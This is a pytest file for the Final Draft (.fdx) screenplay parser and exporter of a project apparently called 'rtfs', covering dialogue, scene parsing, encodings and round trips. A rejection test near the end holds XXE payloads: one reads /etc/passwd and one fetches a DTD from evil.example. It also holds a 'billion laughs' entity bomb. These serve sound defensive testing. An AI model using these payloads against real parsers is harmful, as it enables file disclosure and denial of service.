from __future__ import annotations

import codecs
import xml.etree.ElementTree as ET

import pytest

from rtfs.core.models import (
    Action,
    Dialogue,
    RawScript,
    Scene,
    ScriptDocument,
    ScriptMetadata,
    Transition,
)
from rtfs.exporters.fdx_exp import export_fdx
from rtfs.parsers.fdx import FdxParser


def _make_metadata(title: str = "Test Script", writers: list[str] | None = None) -> ScriptMetadata:
    return ScriptMetadata(
        title=title,
        year=2025,
        media_type="movie",
        writers=[] if writers is None else writers,
        source="test",
        format="screenplay",
        url="https://example.com/test.fdx",
    )


def test_fdx_parser_standard_elements_and_prologue() -> None:
    fdx_xml = """<?xml version="1.0" encoding="UTF-8"?>
<FinalDraft DocumentType="Script" Template="No" Version="5">
  <Content>
    <Paragraph Type="Action">
      <Text>Black screen. Heartbeat.</Text>
    </Paragraph>
    <Paragraph Type="Scene Heading">
      <Text>INT. SERVER ROOM - NIGHT</Text>
    </Paragraph>
    <Paragraph Type="Action">
      <Text>Racks hum in blue light.</Text>
    </Paragraph>
    <Paragraph Type="Shot">
      <Text>CLOSE ON TERMINAL</Text>
    </Paragraph>
    <Paragraph Type="General">
      <Text>Access granted.</Text>
    </Paragraph>
    <Paragraph Type="Character">
      <Text>MORPHEUS (V.O.) (CONT'D)</Text>
    </Paragraph>
    <Paragraph Type="Parenthetical">
      <Text>(quietly)</Text>
    </Paragraph>
    <Paragraph Type="Dialogue">
      <Text>Welcome to the real world.</Text>
    </Paragraph>
    <Paragraph Type="Transition">
      <Text>CUT TO:</Text>
    </Paragraph>
  </Content>
</FinalDraft>
"""
    raw = RawScript(content=fdx_xml, content_type="fdx", metadata=_make_metadata())
    doc = FdxParser().parse(raw)

    assert len(doc.scenes) == 2

    prologue = doc.scenes[0]
    assert prologue.scene_number == 1
    assert prologue.heading == "PROLOGUE"
    assert len(prologue.elements) == 1
    assert isinstance(prologue.elements[0], Action)
    assert prologue.elements[0].text == "Black screen. Heartbeat."

    scene2 = doc.scenes[1]
    assert scene2.scene_number == 2
    assert scene2.heading == "INT. SERVER ROOM - NIGHT"
    assert scene2.location == "SERVER ROOM"
    assert scene2.time_of_day == "NIGHT"

    assert len(scene2.elements) == 5
    assert isinstance(scene2.elements[0], Action)
    assert scene2.elements[0].text == "Racks hum in blue light."
    assert isinstance(scene2.elements[1], Action)
    assert scene2.elements[1].text == "CLOSE ON TERMINAL"
    assert isinstance(scene2.elements[2], Action)
    assert scene2.elements[2].text == "Access granted."

    dlg = scene2.elements[3]
    assert isinstance(dlg, Dialogue)
    assert dlg.character == "MORPHEUS"
    assert dlg.modifiers == ["V.O.", "CONT'D"]
    assert dlg.parenthetical == "quietly"
    assert dlg.lines == "Welcome to the real world."
    assert dlg.dual is False

    trans = scene2.elements[4]
    assert isinstance(trans, Transition)
    assert trans.text == "CUT TO:"


def test_fdx_parser_empty_content() -> None:
    fdx_xml = '<FinalDraft DocumentType="Script" Version="5"><Content/></FinalDraft>'
    raw = RawScript(content=fdx_xml, content_type="fdx", metadata=_make_metadata())
    doc = FdxParser().parse(raw)
    assert doc.scenes == []


def test_fdx_parser_text_runs_and_ignores_notes_and_scene_properties() -> None:
    fdx_xml = """<?xml version="1.0" encoding="UTF-8"?>
<FinalDraft DocumentType="Script" Version="5">
  <Content>
    <Paragraph Type="Scene Heading">
      <SceneProperties Length="1/8" Page="1">
        <Summary>
          <Paragraph><Text>Should be ignored summary</Text></Paragraph>
        </Summary>
      </SceneProperties>
      <Text Style="AllCaps">EXT. ROOFTOP - DAWN</Text>
      <ScriptNote><Paragraph><Text>Ignore note</Text></Paragraph></ScriptNote>
    </Paragraph>
    <Paragraph Type="Action">
      <Text>Rain </Text><Text Style="Bold">pours</Text><Text/><Text> down.</Text>
      <ScriptNote><Paragraph><Text>Never include this note</Text></Paragraph></ScriptNote>
    </Paragraph>
  </Content>
</FinalDraft>
"""
    raw = RawScript(content=fdx_xml, content_type="fdx", metadata=_make_metadata())
    doc = FdxParser().parse(raw)

    assert len(doc.scenes) == 1
    scene = doc.scenes[0]
    assert scene.heading == "EXT. ROOFTOP - DAWN"
    assert len(scene.elements) == 1
    assert isinstance(scene.elements[0], Action)
    assert scene.elements[0].text == "Rain pours down."


def test_fdx_parser_title_page_augments_empty_metadata_only() -> None:
    fdx_xml = """<?xml version="1.0" encoding="UTF-8"?>
<FinalDraft DocumentType="Script" Version="5">
  <TitlePage>
    <Content>
      <Paragraph Alignment="Center"><Text>THE MATRIX</Text></Paragraph>
      <Paragraph Alignment="Center"><Text>Written by</Text></Paragraph>
      <Paragraph Alignment="Center"><Text>Lilly Wachowski &amp; Lana Wachowski</Text></Paragraph>
      <Paragraph Alignment="Left"><Text>Copyright 1998</Text></Paragraph>
    </Content>
  </TitlePage>
  <Content/>
</FinalDraft>
"""
    empty_meta = _make_metadata(title="", writers=[])
    doc1 = FdxParser().parse(RawScript(content=fdx_xml, content_type="fdx", metadata=empty_meta))
    assert doc1.metadata.title == "THE MATRIX"
    assert doc1.metadata.writers == ["Lilly Wachowski", "Lana Wachowski"]

    untitled_meta = _make_metadata(title="Untitled", writers=[])
    doc2 = FdxParser().parse(RawScript(content=fdx_xml, content_type="fdx", metadata=untitled_meta))
    assert doc2.metadata.title == "THE MATRIX"
    assert doc2.metadata.writers == ["Lilly Wachowski", "Lana Wachowski"]

    explicit_meta = _make_metadata(title="Caller Title", writers=["Caller Writer"])
    doc3 = FdxParser().parse(RawScript(content=fdx_xml, content_type="fdx", metadata=explicit_meta))
    assert doc3.metadata.title == "Caller Title"
    assert doc3.metadata.writers == ["Caller Writer"]


def test_fdx_parser_dual_dialogue_both_forms_and_columns() -> None:
    fdx_xml = """<?xml version="1.0" encoding="UTF-8"?>
<FinalDraft DocumentType="Script" Version="5">
  <Content>
    <Paragraph Type="Scene Heading"><Text>INT. BRIDGE - NIGHT</Text></Paragraph>
    <Paragraph>
      <DualDialogue>
        <Paragraph Type="Character"><Text>ALICE</Text></Paragraph>
        <Paragraph Type="Parenthetical"><Text>(shouting)</Text></Paragraph>
        <Paragraph Type="Dialogue"><Text>Turn left!</Text></Paragraph>
        <Paragraph Type="Character"><Text>BOB (O.S.)</Text></Paragraph>
        <Paragraph Type="Dialogue"><Text>Turn right!</Text></Paragraph>
      </DualDialogue>
    </Paragraph>
    <DualDialogue>
      <Column>
        <Paragraph Type="Character"><Text>CAROL</Text></Paragraph>
        <Paragraph Type="Dialogue"><Text>Wait!</Text></Paragraph>
      </Column>
      <Column>
        <Paragraph Type="Character"><Text>DAVE</Text></Paragraph>
        <Paragraph Type="Dialogue"><Text>Go!</Text></Paragraph>
      </Column>
    </DualDialogue>
  </Content>
</FinalDraft>
"""
    doc = FdxParser().parse(
        RawScript(content=fdx_xml, content_type="fdx", metadata=_make_metadata())
    )
    assert len(doc.scenes) == 1
    elements = doc.scenes[0].elements
    assert len(elements) == 4
    assert all(isinstance(e, Dialogue) for e in elements)
    d0, d1, d2, d3 = elements
    assert isinstance(d0, Dialogue) and d0.character == "ALICE" and d0.dual is False
    assert d0.parenthetical == "shouting"
    assert isinstance(d1, Dialogue) and d1.character == "BOB" and d1.dual is True
    assert d1.modifiers == ["O.S."]
    assert isinstance(d2, Dialogue) and d2.character == "CAROL" and d2.dual is False
    assert isinstance(d3, Dialogue) and d3.character == "DAVE" and d3.dual is True


def test_fdx_parser_edge_cases_orphan_dialogue_empty_cue_and_nested_paragraph() -> None:
    fdx_xml = """<?xml version="1.0" encoding="UTF-8"?>
<FinalDraft DocumentType="Script" Version="5">
  <Content>
    <Paragraph Type="Scene Heading"><Text>INT. OFFICE - DAY</Text></Paragraph>
    <Paragraph Type="Dialogue"><Text>Orphan dialogue becomes action.</Text></Paragraph>
    <Paragraph Type="Parenthetical"><Text>(orphan paren)</Text></Paragraph>
    <Paragraph Type="Character"><Text>SILENT</Text></Paragraph>
    <Paragraph Type="Character"><Text>SPEAKER</Text></Paragraph>
    <Paragraph Type="Dialogue"><Text>First line.</Text></Paragraph>
    <Paragraph Type="Parenthetical"><Text>(beat)</Text></Paragraph>
    <Paragraph Type="Dialogue"><Text>Second line.</Text></Paragraph>
    <Paragraph Type="Action">
      <Text>Outer action.</Text>
      <Paragraph Type="Action"><Text>Nested action.</Text></Paragraph>
    </Paragraph>
  </Content>
</FinalDraft>
"""
    doc = FdxParser().parse(
        RawScript(content=fdx_xml, content_type="fdx", metadata=_make_metadata())
    )
    elements = doc.scenes[0].elements
    assert isinstance(elements[0], Action)
    assert elements[0].text == "Orphan dialogue becomes action."
    assert isinstance(elements[1], Action)
    assert elements[1].text == "(orphan paren)"
    assert isinstance(elements[2], Dialogue)
    assert elements[2].character == "SPEAKER"
    assert elements[2].lines == "First line. (beat) Second line."
    assert isinstance(elements[3], Action)
    assert elements[3].text == "Outer action."
    assert isinstance(elements[4], Action)
    assert elements[4].text == "Nested action."


_CAFE_FDX = (
    '<FinalDraft><Content><Paragraph Type="Action">'
    "<Text>Café</Text></Paragraph></Content></FinalDraft>"
)


@pytest.mark.parametrize(
    "payload",
    [
        _CAFE_FDX,
        f"\ufeff{_CAFE_FDX}",
        _CAFE_FDX.encode(),
        codecs.BOM_UTF8 + _CAFE_FDX.encode(),
        f'<?xml version="1.0" encoding="UTF-16"?>{_CAFE_FDX}'.encode("utf-16"),
        f'<?xml version="1.0" encoding="ISO-8859-1"?>{_CAFE_FDX}'.encode("iso-8859-1"),
    ],
)
def test_fdx_parser_encodings(payload: bytes | str) -> None:
    doc = FdxParser().parse(
        RawScript(content=payload, content_type="fdx", metadata=_make_metadata())
    )
    assert len(doc.scenes) == 1
    assert isinstance(doc.scenes[0].elements[0], Action)
    assert doc.scenes[0].elements[0].text == "Café"


def test_export_fdx_structure_escaping_and_sanitization() -> None:
    doc = ScriptDocument(
        metadata=_make_metadata(title="Control \x00 & <Test>\ufffe", writers=["Alice", "Bob\x07"]),
        scenes=[
            Scene(
                scene_number=1,
                heading="INT. LAB - DAY",
                location="LAB",
                time_of_day="DAY",
                elements=[
                    Action(text="A & B < C > D\x0b\x0c\x1f\tkept\nline"),
                    Dialogue(
                        character="ALICE",
                        modifiers=["V.O."],
                        parenthetical="softly",
                        lines="Hi\x01.",
                    ),
                    Dialogue(character="BOB", lines="Hey.", dual=True),
                    Transition(text="CUT TO:"),
                    Dialogue(character="ORPHAN_DUAL", lines="Solo dual", dual=True),
                ],
            )
        ],
    )

    xml_out = export_fdx(doc)
    assert xml_out.startswith('<?xml version="1.0" encoding="UTF-8"?>\n')
    root = ET.fromstring(xml_out)
    assert root.tag == "FinalDraft"
    assert root.attrib["DocumentType"] == "Script"
    assert root.attrib["Template"] == "No"
    assert root.attrib["Version"] == "5"

    assert "\x00" not in xml_out
    assert "\x07" not in xml_out
    assert "\x0b" not in xml_out
    assert "\x0c" not in xml_out
    assert "\x1f" not in xml_out
    assert "\ufffe" not in xml_out
    assert "\tkept\nline" in xml_out

    dual_blocks = root.findall(".//DualDialogue")
    assert len(dual_blocks) == 2


def test_fdx_round_trip() -> None:
    original = ScriptDocument(
        metadata=_make_metadata(title="", writers=[]),
        scenes=[
            Scene(
                scene_number=1,
                heading="INT. SHIP DECK - NIGHT",
                location="SHIP DECK",
                time_of_day="NIGHT",
                elements=[
                    Action(text="First action paragraph."),
                    Action(text="Second distinct action paragraph."),
                    Dialogue(
                        character="ALICE",
                        modifiers=["V.O."],
                        parenthetical="whispering",
                        lines="Watch the radar.",
                        dual=False,
                    ),
                    Dialogue(
                        character="BOB",
                        modifiers=["O.S."],
                        parenthetical=None,
                        lines="Copy that.",
                        dual=True,
                    ),
                    Transition(text="SMASH CUT TO:"),
                ],
            )
        ],
    )
    original.metadata = _make_metadata(title="Round Trip", writers=["Jane Doe", "John Roe"])

    xml_out = export_fdx(original)
    round_tripped = FdxParser().parse(
        RawScript(
            content=xml_out,
            content_type="fdx",
            metadata=_make_metadata(title="", writers=[]),
        )
    )

    assert round_tripped.metadata.title == "Round Trip"
    assert round_tripped.metadata.writers == ["Jane Doe", "John Roe"]
    assert round_tripped.scenes == original.scenes


@pytest.mark.parametrize(
    "bad_xml",
    [
        "",
        "   \n\t ",
        b"",
        "<FinalDraft><Content><Paragraph></FinalDraft>",
        "<html><body>Not FDX</body></html>",
        '<!DOCTYPE FinalDraft><FinalDraft><Content/></FinalDraft>',
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<FinalDraft><Content><Paragraph Type="Action"><Text>&xxe;</Text>'
        "</Paragraph></Content></FinalDraft>",
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo [<!ENTITY % pe SYSTEM "http://evil.example/dtd">%pe;]>'
        "<FinalDraft><Content/></FinalDraft>",
        '<?xml version="1.0"?>'
        '<!DOCTYPE lolz [<!ENTITY lol "lol">'
        '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
        '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]>'
        '<FinalDraft><Content><Paragraph Type="Action"><Text>&lol3;</Text>'
        "</Paragraph></Content></FinalDraft>",
    ],
)
def test_fdx_parser_rejects_malformed_and_unsafe_xml(bad_xml: bytes | str) -> None:
    raw = RawScript(content=bad_xml, content_type="fdx", metadata=_make_metadata())
    with pytest.raises(ValueError):
        FdxParser().parse(raw)


def test_fdx_parser_rejects_wrong_content_type() -> None:
    raw = RawScript(
        content="<FinalDraft><Content/></FinalDraft>",
        content_type="html",
        metadata=_make_metadata(),
    )
    with pytest.raises(ValueError, match="content_type"):
        FdxParser().parse(raw)
